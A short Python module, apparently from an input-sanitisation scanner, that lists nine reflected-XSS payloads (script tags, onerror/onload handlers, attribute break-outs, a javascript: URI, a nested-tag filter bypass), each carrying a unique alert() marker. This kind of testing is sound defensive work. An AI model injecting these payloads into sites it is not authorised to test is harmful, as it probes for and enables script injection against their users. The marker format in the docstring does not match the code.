"""
Payload set for reflected XSS / basic input-sanitization testing.

Each payload includes a unique marker (XSSMARK_<id>) so the scanner can
confirm the *exact* payload came back unescaped, rather than just noticing
that *some* '<script>' tag exists on the page (which could be unrelated).
"""

import uuid


def build_payloads():
    """
    Returns a list of (name, payload_template) tuples.
    payload_template contains {marker} which gets replaced with a unique id.
    """
    return [
        ("basic_script", "<script>alert('{marker}')</script>"),
        ("img_onerror", "<img src=x onerror=alert('{marker}')>"),
        ("svg_onload", "<svg onload=alert('{marker}')>"),
        ("body_onload", "<body onload=alert('{marker}')>"),
        ("attr_break_dquote", "\"><script>alert('{marker}')</script>"),
        ("attr_break_squote", "'><script>alert('{marker}')</script>"),
        ("javascript_uri", "javascript:alert('{marker}')"),
        ("event_handler", "\" onmouseover=\"alert('{marker}')"),
        ("html_entity_bypass", "<scr<script>ipt>alert('{marker}')</scr</script>ipt>"),
    ]


def generate_marker():
    """A short unique token so we can trace exactly which injection reflected."""
    return "xssmark" + uuid.uuid4().hex[:8]


def render_payload(template, marker):
    return template.format(marker=marker)
